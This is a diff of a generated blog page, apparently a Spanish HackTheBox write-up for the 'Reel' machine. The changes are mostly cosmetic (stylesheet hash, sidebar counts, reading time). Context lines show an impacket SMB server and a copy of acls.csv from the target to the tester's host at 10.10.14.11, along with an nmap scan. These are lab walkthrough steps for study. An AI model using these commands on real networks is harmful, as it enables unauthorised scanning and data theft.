@@ -155,7 +155,7 @@
 
 
   
- <link rel="stylesheet" href="/css/main.min.7b6828da25ebf17aaa1c6522076809e08d2cdc057a9084a0154b53df0166608a.css" />
+ <link rel="stylesheet" href="/css/main.min.8c20df3b49214b6a60e9713b969bba46f323b1aa17f0f3fe02d14500a9aa5dd2.css" />
 
 
 
@@ -395,12 +395,12 @@
   <div class="sidebar-state-category">
     <div>Categories</div>
     <div class="sidebar-state-number">
-      4
+      3
     </div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">12</div>
+    <div class="sidebar-state-number">11</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -622,7 +622,8 @@ Domain         : HTB
 </code></pre><p>Vamos a la ruta <code>C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors</code></p>
 <p>Aquí encontramos un acls.csv</p>
 <blockquote>
-<p><code>acls.csv</code> generalmente se refiere a un archivo que contiene información sobre las Listas de Control de Acceso</p></blockquote>
+<p><code>acls.csv</code> generalmente se refiere a un archivo que contiene información sobre las Listas de Control de Acceso</p>
+</blockquote>
 <p>Nos lo pasamos a local para verlo mejor</p>
 <pre tabindex="0"><code>smbserver.py acl $(pwd) -smb2support
 </code></pre><pre tabindex="0"><code>copy acls.csv \\10.10.14.11\acl\acls.csv
@@ -773,7 +774,7 @@ htb\administrator
       <div>
         <span class="icon-brush"
           >&nbsp;
-            7.4k
+            8.1k
           </span
         >
         &nbsp;|&nbsp;
@@ -781,7 +782,7 @@ htb\administrator
           
           
 
-          00:41
+          00:44
         </span>
       </div>
     
@@ -846,12 +847,12 @@ htb\administrator
   <div class="sidebar-state-category">
     <div>Categories</div>
     <div class="sidebar-state-number">
-      4
+      3
     </div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">12</div>
+    <div class="sidebar-state-number">11</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -1121,7 +1122,7 @@ htb\administrator
           author: "Fouen",
           title: "Reel",
           url: "https:\/\/fouen.github.io\/post\/hackthebox\/reel\/",
-          description: " Reconocimiento Nmap Escaneamos la maquina para ver que puertos tiene abiertos:\nnmap -p- --open --min-rate 5000 -Pn -n 10.10.10.77 PORT STATE SERVICE 21\/tcp open ftp 22\/tcp open ssh 25\/tcp open smtp 135\/tcp open msrpc 139\/tcp open netbios-ssn 445\/tcp open microsoft-ds 593\/tcp open http-rpc-epmap …",
+          description: "\rReconocimiento\rNmap\rEscaneamos la maquina para ver que puertos tiene abiertos:\nnmap -p- --open --min-rate 5000 -Pn -n 10.10.10.77 PORT STATE SERVICE\r21\/tcp open ftp\r22\/tcp open ssh\r25\/tcp open smtp\r135\/tcp open msrpc\r139\/tcp open netbios-ssn\r445\/tcp open microsoft-ds\r593\/tcp open http-rpc-epmap …",
           cover: "https:\/\/fouen.github.io\/images\/reel.png",
         };
       </script>
